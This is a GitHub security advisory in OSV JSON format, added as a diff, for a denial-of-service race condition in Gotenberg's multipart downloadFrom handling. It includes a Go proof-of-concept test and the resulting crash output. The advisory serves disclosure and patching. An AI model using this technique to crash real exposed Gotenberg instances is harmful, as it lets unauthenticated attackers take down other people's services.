@@ -1,0 +1,50 @@
+{
+  "id": "GHSA-vp73-vjw8-8f32",
+  "modified": "2026-05-29T17:00:08.191099964Z",
+  "published": "2026-05-29T16:56:18Z",
+  "aliases": [
+    "CVE-2026-45742"
+  ],
+  "summary": "Gotenberg has a Race Condition via Multipart `downloadFrom` Handling",
+  "details": "### Summary\n\nGotenberg is vulnerable to a remote denial of service in multipart `downloadFrom` handling.\n\nA multipart request containing multiple `downloadFrom` entries causes concurrent goroutines to write to shared maps without synchronization. This can terminate the process with `fatal error: concurrent map writes`.\n\nIn the default configuration, `downloadFrom` is enabled and authentication is disabled, so an exposed instance can be crashed by an unauthenticated remote attacker.\n\n### Details\n\nThe issue is in `pkg/modules/api/context.go`.\n\n`newContext` parses multipart requests and processes the `downloadFrom` form field before the route handler runs. For each `downloadFrom` entry, it starts a goroutine via `errgroup.Go()`:\n\n- `pkg/modules/api/context.go:221`\n\nEach goroutine downloads a file and then writes to request context maps shared by all goroutines:\n\n- `ctx.files[filename] = path`\n- `ctx.diskToOriginal[path] = filename`\n- `ctx.filesByField[...] = append(...)`\n\nAffected lines in current `main`:\n\n- `pkg/modules/api/context.go:395`\n- `pkg/modules/api/context.go:396`\n- `pkg/modules/api/context.go:401`\n\nGo maps and slices are not safe for concurrent writes. A crafted multipart request with many `downloadFrom` entries can therefore trigger a runtime crash.\n\nThe vulnerable `downloadFrom` feature was introduced in commit `f2b6bd3d`. The first tagged release containing this code appears to be `v8.10.0`.\n\n### PoC\n\nThe following self-contained command creates a temporary test file, runs the PoC, and removes the file afterwards. It does not require any external network access.\n\nRun from the repository root:\n\n    cat \u003e pkg/modules/api/downloadfrom_race_poc_test.go \u003c\u003c'EOF'\n    //go:build security_poc\n\n    package api\n\n    import (\n        \"bytes\"\n        \"encoding/json\"\n        \"fmt\"\n        \"log/slog\"\n        \"mime/multipart\"\n        \"net/http\"\n        \"net/http/httptest\"\n        \"sync\"\n        \"testing\"\n        \"time\"\n\n        \"github.com/labstack/echo/v4\"\n\n        \"github.com/gotenberg/gotenberg/v8/pkg/gotenberg\"\n    )\n\n    func TestSecurityPoCDownloadFromConcurrentMapWrites(t *testing.T) {\n        const downloads = 64\n\n        var ready sync.WaitGroup\n        ready.Add(downloads)\n        release := make(chan struct{})\n        var releaseOnce sync.Once\n\n        server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n            ready.Done()\n            go func() {\n                ready.Wait()\n                releaseOnce.Do(func() {\n                    close(release)\n                })\n            }()\n            \u003c-release\n\n            filename := fmt.Sprintf(\"download-%s.txt\", r.URL.Query().Get(\"i\"))\n            w.Header().Set(\"Content-Disposition\", fmt.Sprintf(`attachment; filename=\"%s\"`, filename))\n            _, _ = w.Write([]byte(\"downloaded\"))\n        }))\n        defer server.Close()\n\n        dls := make([]downloadFrom, downloads)\n        for i := range dls {\n            dls[i] = downloadFrom{\n                Url:   fmt.Sprintf(\"%s/file?i=%d\", server.URL, i),\n                Field: \"embedded\",\n            }\n        }\n\n        payload, err := json.Marshal(dls)\n        if err != nil {\n            t.Fatalf(\"marshal downloadFrom payload: %v\", err)\n        }\n\n        body := new(bytes.Buffer)\n        writer := multipart.NewWriter(body)\n        err = writer.WriteField(\"downloadFrom\", string(payload))\n        if err != nil {\n            t.Fatalf(\"write downloadFrom field: %v\", err)\n        }\n        err = writer.Close()\n        if err != nil {\n            t.Fatalf(\"close multipart writer: %v\", err)\n        }\n\n        req := httptest.NewRequest(http.MethodPost, \"/forms/libreoffice/convert\", body)\n        req.Header.Set(\"Content-Type\", writer.FormDataContentType())\n\n        echoCtx := echo.New().NewContext(req, httptest.NewRecorder())\n        logger := slog.New(slog.DiscardHandler)\n        fs := gotenberg.NewFileSystem(new(gotenberg.OsMkdirAll))\n        downloadFromCfg := downloadFromConfig{\n            maxRetry: 0,\n        }\n\n        ctx, cancel, err := newContext(echoCtx, logger, fs, 10*time.Second, 0, downloadFromCfg)\n        if err != nil {\n            t.Fatalf(\"newContext returned error: %v\", err)\n        }\n        defer cancel()\n\n        if got := len(ctx.files); got != downloads {\n            t.Fatalf(\"downloaded files = %d, want %d\", got, downloads)\n        }\n    }\n    EOF\n\n    GOTOOLCHAIN=go1.26.2 go test -race -tags security_poc ./pkg/modules/api -run TestSecurityPoCDownloadFromConcurrentMapWrites -count=1\n    rm pkg/modules/api/downloadfrom_race_poc_test.go\n\nExpected result with the race detector:\n\n    WARNING: DATA RACE\n    Write at ...\n      github.com/gotenberg/gotenberg/v8/pkg/modules/api.newContext.func3()\n        .../pkg/modules/api/context.go:395\n\n    WARNING: DATA RACE\n      .../pkg/modules/api/context.go:396\n\n    WARNING: DATA RACE\n      .../pkg/modules/api/context.go:401\n\nRunning the same PoC without `-race` also demonstrates practical process termination:\n\n    GOTOOLCHAIN=go1.26.2 go test -tags security_poc ./pkg/modules/api -run TestSecurityPoCDownloadFromConcurrentMapWrites -count=20\n\nObserved result:\n\n    fatal error: concurrent map writes\n    github.com/gotenberg/gotenberg/v8/pkg/modules/api.newContext.func3()\n      .../pkg/modules/api/context.go:395\n    FAIL github.com/gotenberg/gotenberg/v8/pkg/modules/api\n\n### Impact\n\nThis is a remote denial-of-service vulnerability.\n\nAny deployment that exposes multipart conversion endpoints with `downloadFrom` enabled is affected. In the default configuration, `downloadFrom` is enabled and basic authentication is disabled, so internet-exposed default deployments may be vulnerable to unauthenticated process termination.\n\nThe vulnerability affects availability only. I did not find evidence of confidentiality or integrity impact.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/gotenberg/gotenberg/v8",
+        "purl": "pkg:golang/github.com/gotenberg/gotenberg/v8"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "8.10.0"
+            },
+            {
+              "fixed": "8.33.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 8.32.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-vp73-vjw8-8f32/GHSA-vp73-vjw8-8f32.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/gotenberg/gotenberg/security/advisories/GHSA-vp73-vjw8-8f32"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/gotenberg/gotenberg"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gotenberg/gotenberg/releases/tag/v8.33.0"
+    }
+  ]
+}
